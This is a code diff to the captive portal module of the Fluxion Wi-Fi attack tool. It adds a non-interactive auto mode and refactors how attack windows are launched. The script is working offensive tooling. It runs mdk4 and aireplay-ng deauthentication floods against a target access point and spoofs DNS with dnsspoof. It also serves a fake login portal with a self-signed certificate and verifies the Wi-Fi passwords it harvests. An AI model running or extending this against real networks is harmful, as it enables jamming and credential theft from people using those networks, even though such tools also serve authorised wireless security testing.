@@ -37,7 +37,9 @@ captive_portal_set_jammer_interface() {
 
   if [ ! "$CaptivePortalJammerInterfaceOriginal" ]; then
     echo "Running get jammer interface." > $FLUXIONOutputDevice
-    if ! fluxion_get_interface attack_targetting_interfaces \
+    if [ "$FLUXIONJammerInterface" ]; then
+      FluxionInterfaceSelected="$FLUXIONJammerInterface"
+    elif ! fluxion_get_interface attack_targetting_interfaces \
       "$CaptivePortalJammerInterfaceQuery"; then
       echo "Failed to get jammer interface" > $FLUXIONOutputDevice
       return 1
@@ -91,7 +93,9 @@ captive_portal_set_ap_interface() {
 
   if [ ! "$CaptivePortalAccessPointInterfaceOriginal" ]; then
     echo "Running get ap interface." > $FLUXIONOutputDevice
-    if ! fluxion_get_interface captive_portal_ap_interfaces \
+    if [ "$FLUXIONAPInterface" ]; then
+      FluxionInterfaceSelected="$FLUXIONAPInterface"
+    elif ! fluxion_get_interface captive_portal_ap_interfaces \
       "$CaptivePortalAccessPointInterfaceQuery"; then
       echo "Failed to get ap interface" > $FLUXIONOutputDevice
       return 1
@@ -166,13 +170,16 @@ function captive_portal_set_ap_service() {
 
   captive_portal_unset_ap_service
 
-fluxion_header
+  if [ "$FLUXIONAuto" ]; then
+    option_deauth=1  # Default to mdk4 in auto mode.
+  else
+    fluxion_header
 
-echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
-echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4${CClr}"
-echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay${CClr}"
-read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
-
+    echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
+    echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4${CClr}"
+    echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay${CClr}"
+    read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
+  fi
 
   if [ "$FLUXIONAuto" ]; then
     CaptivePortalAPService="hostapd"
@@ -241,31 +248,35 @@ captive_portal_set_authenticator() {
 
   captive_portal_unset_authenticator
 
-  fluxion_header
+  if [ "$FLUXIONAuto" ]; then
+    CaptivePortalAuthenticatorMode="$CaptivePortalVerificationMethodCowpattyOption"
+  else
+    fluxion_header
 
-  echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
-  echo
+    echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
+    echo
 
-  fluxion_target_show
+    fluxion_target_show
 
-  local choices=(
-    "$CaptivePortalVerificationMethodCowpattyOption"
-    "$CaptivePortalVerificationMethodAircrackNG"
-  )
+    local choices=(
+      "$CaptivePortalVerificationMethodCowpattyOption"
+      "$CaptivePortalVerificationMethodAircrackNG"
+    )
 
-  # Add pyrit to the options if available.
-  if [ -x "$(command -v pyrit)" ]; then
-    choices+=("$CaptivePortalVerificationMethodPyritOption")
+    # Add pyrit to the options if available.
+    if [ -x "$(command -v pyrit)" ]; then
+      choices+=("$CaptivePortalVerificationMethodPyritOption")
+    fi
+
+    # Add back option.
+    choices+=("$FLUXIONGeneralBackOption")
+
+    io_query_choice "" choices[@]
+
+    echo
+
+    CaptivePortalAuthenticatorMode="${IOQueryChoice}"
   fi
-
-  # Add back option.
-  choices+=("$FLUXIONGeneralBackOption")
-
-  io_query_choice "" choices[@]
-
-  echo
-
-  CaptivePortalAuthenticatorMode="${IOQueryChoice}"
 
   # If we're going back, reset everything and abort.
   if [[ \
@@ -310,12 +321,9 @@ captive_portal_set_authenticator() {
 }
 
 captive_portal_run_certificate_generator() {
-  xterm -bg "#000000" -fg "#CCCCCC" \
-    -title "Generating Self-Signed SSL Certificate" -e openssl req \
-    -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' \
-    -new -newkey rsa:2048 -days 365 -nodes -x509 \
-    -keyout "$FLUXIONWorkspacePath/server.pem" \
-    -out "$FLUXIONWorkspacePath/server.pem"
+  fluxion_window_open "" \
+    "Generating Self-Signed SSL Certificate" "" "#000000" "#CCCCCC" \
+    "openssl req -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout \"$FLUXIONWorkspacePath/server.pem\" -out \"$FLUXIONWorkspacePath/server.pem\""
     # Details -> https://www.openssl.org/docs/manmaster/apps/openssl.html
   chmod 400 "$FLUXIONWorkspacePath/server.pem"
 }
@@ -477,6 +485,15 @@ captive_portal_set_user_interface() {
   fi
 
   captive_portal_unset_user_interface
+
+  if [ "$FLUXIONAuto" ]; then
+    # Auto mode: use generic English portal.
+    if [ -f "$attackPath/generic/languages/English.lang" ]; then
+      CaptivePortalUserInterface="English"
+      return 0
+    fi
+    return 1
+  fi
 
   local sites=()
 
@@ -1207,7 +1224,9 @@ captive_portal_start_interface() {
     echo
 
     echo -e "$FLUXIONVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
-    read -n1 -p "Press any key to continue... " bullshit
+    if [ ! "$FLUXIONAuto" ]; then
+      read -n1 -p "Press any key to continue... " bullshit
+    fi
   fi
 
   echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
@@ -1403,7 +1422,7 @@ stop_attack() {
     fi
     
     fluxion_kill_lineage "--signal SIGABRT" \
-      "xterm.+captive_portal_authenticator\\.sh" &> /dev/null
+      "captive_portal_authenticator\\.sh" &> /dev/null
     pkill -9 -f "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" \
       &> $FLUXIONOutputDevice
   fi
@@ -1425,6 +1444,8 @@ stop_attack() {
     fluxion_kill_lineage $CaptivePortalWebServicePID
     CaptivePortalWebServicePID="" # Clear service PID
   fi
+  # Fallback: kill any lighttpd using fluxion's workspace config (handles daemon-restart edge cases).
+  pkill -f "lighttpd.*$FLUXIONWorkspacePath" &>/dev/null || true
 
   # Kill DNS service if one is found.
   if [ "$CaptivePortalDNSServiceXtermPID" ]; then
@@ -1527,34 +1548,30 @@ start_attack() {
 
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
-  xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#CCCC00" \
-    -title "FLUXION AP DHCP Service" -e \
-    "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $CaptivePortalAccessInterface 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
-  # Save parent's pid, to get to child later.
-  CaptivePortalDHCPServiceXtermPID=$!
+  fluxion_window_open CaptivePortalDHCPServiceXtermPID \
+    "FLUXION AP DHCP Service" "$TOPLEFT" "black" "#CCCC00" \
+    "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $CaptivePortalAccessInterface 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\""
   echo "DHCP Service: $CaptivePortalDHCPServiceXtermPID" \
     >> $FLUXIONOutputDevice
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
-  xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg black -fg "#99CCFF" \
-    -title "FLUXION AP DNS Service" -e \
-    "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$FLUXIONWorkspacePath/hosts\"" &
-  # Save parent's pid, to get to child later.
-  CaptivePortalDNSServiceXtermPID=$!
+  fluxion_window_open CaptivePortalDNSServiceXtermPID \
+    "FLUXION AP DNS Service" "$BOTTOMLEFT" "black" "#99CCFF" \
+    "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$FLUXIONWorkspacePath/hosts\""
   echo "DNS Service: $CaptivePortalDNSServiceXtermPID" \
     >> $FLUXIONOutputDevice
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
   # Clear any previous log entries
   > "$FLUXIONWorkspacePath/lighttpd.log"
-  lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" \
-    &> $FLUXIONOutputDevice
+  # Run lighttpd with -D (foreground, no fork) so $! captures the real PID.
+  lighttpd -D -f "$FLUXIONWorkspacePath/lighttpd.conf" \
+    &> $FLUXIONOutputDevice &
   CaptivePortalWebServicePID=$!
 
-  xterm $FLUXIONHoldXterm $BOTTOM -bg black -fg "#00CC00" \
-    -title "FLUXION Web Service" -e \
-    "tail -f \"$FLUXIONWorkspacePath/lighttpd.log\"" &
-  CaptivePortalWebServiceXtermPID=$!
+  fluxion_window_open CaptivePortalWebServiceXtermPID \
+    "FLUXION Web Service" "$BOTTOM" "black" "#00CC00" \
+    "tail -f \"$FLUXIONWorkspacePath/lighttpd.log\""
   echo "Web Service: $CaptivePortalWebServiceXtermPID" \
     >> $FLUXIONOutputDevice
 
@@ -1577,36 +1594,25 @@ start_attack() {
   fi
 
   if [ $FLUXIONEnable5GHZ -eq 1 ]; then
-    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
-    # Save parent's pid, to get to child later.
-    CaptivePortalJammerServiceXtermPID=$!
+    fluxion_window_open CaptivePortalJammerServiceXtermPID \
+        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC"
   elif [[ $option_deauth -eq 1 ]]; then
-
-	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
-        # Save parent's pid, to get to child later.
-    	CaptivePortalJammerServiceXtermPID=$!
+    fluxion_window_open CaptivePortalJammerServiceXtermPID \
+        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\""
   elif [[ $option_deauth -eq 2 ]]; then
-
-	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface" &
-        # Save parent's pid, to get to child later.
-    	CaptivePortalJammerServiceXtermPID=$!
+    fluxion_window_open CaptivePortalJammerServiceXtermPID \
+        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
   fi
   echo "Jammer Service: $CaptivePortalJammerServiceXtermPID" \
     >> $FLUXIONOutputDevice
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
-  xterm -hold $TOPRIGHT -bg black -fg "#CCCCCC" \
-    -title "FLUXION AP Authenticator" \
-    -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
-
-  CaptivePortalAuthenticatorServiceXtermPID=$!
-  disown
+  fluxion_window_open CaptivePortalAuthenticatorServiceXtermPID \
+    "FLUXION AP Authenticator" "$TOPRIGHT" "black" "#CCCCCC" \
+    "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
   echo "Auth Service: $CaptivePortalAuthenticatorServiceXtermPID" \
     >> $FLUXIONOutputDevice
 }
